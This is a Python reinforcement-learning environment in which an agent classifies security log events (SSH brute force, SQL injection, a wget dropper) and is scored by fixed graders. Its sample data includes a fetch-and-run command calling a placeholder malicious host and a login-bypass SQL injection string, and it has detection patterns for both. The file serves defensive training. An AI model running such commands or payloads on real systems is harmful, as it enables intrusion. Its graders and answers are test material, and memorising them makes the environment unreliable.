# Copyright (c) Meta Platforms, Inc. and affiliates.
# All rights reserved.
#
# This source code is licensed under the BSD-style license found in the
# LICENSE file in the root directory of this source tree.

"""
Cyber Triage Environment — Easy: Brute Force; Medium: SQLi; Hard: Multi-Vector Anomaly.

Each episode is one triage decision: reset samples a task at random; step scores it.
"""

from __future__ import annotations

import random
from typing import Any, Final, Literal, Optional
from uuid import uuid4

from openenv.core.env_server.interfaces import Environment
from openenv.core.env_server.types import State

try:
    from ..models import CyberTriageAction, CyberTriageObservation
except ImportError:
    from models import CyberTriageAction, CyberTriageObservation

BRUTE_FORCE_THRESHOLD: Final[int] = 100

TaskId = Literal[
    "brute_force_blocker",
    "payload_inspector",
    "multi_vector_anomaly",
]
_TASK_CHOICES: tuple[TaskId, TaskId, TaskId] = (
    "brute_force_blocker",
    "payload_inspector",
    "multi_vector_anomaly",
)

_EASY_SOURCE_IP = "203.0.113.50"
_MEDIUM_SOURCE_IP = "198.51.100.23"
_HARD_SOURCE_IP = "104.28.14.88"

_HARD_PAYLOAD_SNIPPET = (
    "wget http://malicious-domain.com/drop.sh; chmod +x drop.sh; ./drop.sh"
)


class CyberTriageEnvironment(Environment[CyberTriageAction, CyberTriageObservation, State]):
    """One observation per reset (easy, medium, or hard task); one graded step."""

    SUPPORTS_CONCURRENT_SESSIONS: bool = True

    def __init__(
        self,
        transform: Any = None,
        rubric: Any = None,
    ):
        super().__init__(transform=transform, rubric=rubric)
        self._state = State(episode_id=str(uuid4()), step_count=0)
        self._reset_count = 0
        self._last_observation: Optional[CyberTriageObservation] = None

    @staticmethod
    def grade_brute_force_blocker(
        action: CyberTriageAction,
        source_ip: str,
    ) -> float:
        """
        Deterministic grader for the Brute Force Blocker task.

        Returns:
            0.99 — "Critical Attack" and quarantine_ip equals source_ip exactly.
            0.5 — "Critical Attack" but quarantine_ip is missing (None).
            0.01 — all other cases.
        """
        if action.classification != "Critical Attack":
            return 0.01
        if action.quarantine_ip == source_ip:
            return 0.99
        if action.quarantine_ip is None:
            return 0.5
        return 0.01

    @staticmethod
    def grade_payload_inspector(
        action: CyberTriageAction,
        source_ip: str,
    ) -> float:
        """
        Deterministic grader for the Payload Inspector (SQL injection) task.

        Returns:
            0.99 — "Critical Attack" and quarantine_ip equals source_ip.
            0.5 — "Suspicious" and quarantine_ip equals source_ip.
            0.01 — otherwise.
        """
        if action.quarantine_ip != source_ip:
            return 0.01
        if action.classification == "Critical Attack":
            return 0.99
        if action.classification == "Suspicious":
            return 0.5
        return 0.01

    @staticmethod
    def grade_multi_vector_anomaly(
        action: CyberTriageAction,
        source_ip: str,
    ) -> float:
        """
        Deterministic grader for the Multi-Vector Anomaly (dropper / execution) task.

        Returns:
            0.99 — "Critical Attack" and quarantine_ip equals source_ip.
            0.5 — "Suspicious" and quarantine_ip equals source_ip.
            0.01 — otherwise.
        """
        if action.quarantine_ip != source_ip:
            return 0.01
        if action.classification == "Critical Attack":
            return 0.99
        if action.classification == "Suspicious":
            return 0.5
        return 0.01

    @staticmethod
    def _payload_indicates_sql_injection(payload_snippet: str) -> bool:
        """True if the snippet shows common SQL injection tautology / comment patterns."""
        s = payload_snippet.lower()
        compact = s.replace(" ", "")
        if "'1'='1'" in compact or '"1"="1"' in compact:
            return True
        if "or1=1" in compact:
            return True
        if "' or " in s and "=" in s:
            return True
        if "union" in s and "select" in s:
            return True
        if "--" in payload_snippet or ";/*" in s:
            return True
        return False

    @staticmethod
    def _payload_indicates_wget_and_execution(payload_snippet: str) -> bool:
        """True if the snippet suggests remote fetch plus local execution (dropper pattern)."""
        s = payload_snippet.lower()
        if "wget" not in s:
            return False
        chmod_exec = "chmod" in s and "+x" in payload_snippet
        invokes_script = "./" in payload_snippet
        return chmod_exec or invokes_script

    def _is_clear_brute_force(self, obs: CyberTriageObservation) -> bool:
        return obs.failed_login_attempts > BRUTE_FORCE_THRESHOLD

    def _task_for_observation(self, obs: CyberTriageObservation) -> TaskId:
        task = obs.metadata.get("task")
        if task == "payload_inspector":
            return "payload_inspector"
        if task == "multi_vector_anomaly":
            return "multi_vector_anomaly"
        return "brute_force_blocker"

    def reset(
        self,
        seed: Optional[int] = None,
        episode_id: Optional[str] = None,
        **kwargs: Any,
    ) -> CyberTriageObservation:
        self._reset_rubric()
        eid = episode_id if episode_id is not None else str(uuid4())
        self._state = State(episode_id=eid, step_count=0)
        self._reset_count += 1

        rng = random.Random(seed) if seed is not None else random.Random()
        task: TaskId = rng.choice(_TASK_CHOICES)

        if task == "brute_force_blocker":
            obs = CyberTriageObservation(
                log_id="evt-brute-force-easy-001",
                source_ip=_EASY_SOURCE_IP,
                protocol="SSH",
                payload_snippet="Failed password for invalid user admin",
                failed_login_attempts=247,
                done=False,
                reward=0.01,
                metadata={"task": task},
            )
        elif task == "payload_inspector":
            obs = CyberTriageObservation(
                log_id="evt-sqli-medium-001",
                source_ip=_MEDIUM_SOURCE_IP,
                protocol="HTTPS",
                payload_snippet="admin' OR '1'='1' --",
                failed_login_attempts=0,
                done=False,
                reward=0.01,
                metadata={"task": task},
            )
        else:
            obs = CyberTriageObservation(
                log_id="evt-multi-vector-hard-001",
                source_ip=_HARD_SOURCE_IP,
                protocol="SSH",
                payload_snippet=_HARD_PAYLOAD_SNIPPET,
                failed_login_attempts=3,
                done=False,
                reward=0.01,
                metadata={"task": task},
            )
        self._last_observation = obs
        return self._apply_transform(obs)

    def step(
        self,
        action: CyberTriageAction,
        timeout_s: Optional[float] = None,
        **kwargs: Any,
    ) -> CyberTriageObservation:
        if self._last_observation is None:
            self._last_observation = self.reset()

        self._state.step_count += 1
        obs = self._last_observation
        source_ip = obs.source_ip
        task = self._task_for_observation(obs)

        if task == "payload_inspector":
            grader = self.grade_payload_inspector(action, source_ip)
        elif task == "multi_vector_anomaly":
            grader = self.grade_multi_vector_anomaly(action, source_ip)
        else:
            grader = self.grade_brute_force_blocker(action, source_ip)

        reward: float = grader

        if self._is_clear_brute_force(obs) and action.classification == "Safe":
            reward = 0.01
        elif (
            self._payload_indicates_sql_injection(obs.payload_snippet)
            and action.classification == "Safe"
        ):
            reward = 0.01
        elif (
            self._payload_indicates_wget_and_execution(obs.payload_snippet)
            and action.classification == "Safe"
        ):
            reward = 0.01

        grader = max(0.01, min(0.99, float(grader)))
        reward = max(0.01, min(0.99, float(reward)))

        obs_result = CyberTriageObservation(
            log_id=obs.log_id,
            source_ip=obs.source_ip,
            protocol=obs.protocol,
            payload_snippet=obs.payload_snippet,
            failed_login_attempts=obs.failed_login_attempts,
            done=True,
            reward=reward,
            metadata={
                **obs.metadata,
                "grader_score": grader,
                "step": self._state.step_count,
            },
        )
        return self._apply_transform(obs_result)

    @property
    def state(self) -> State:
        return self._state
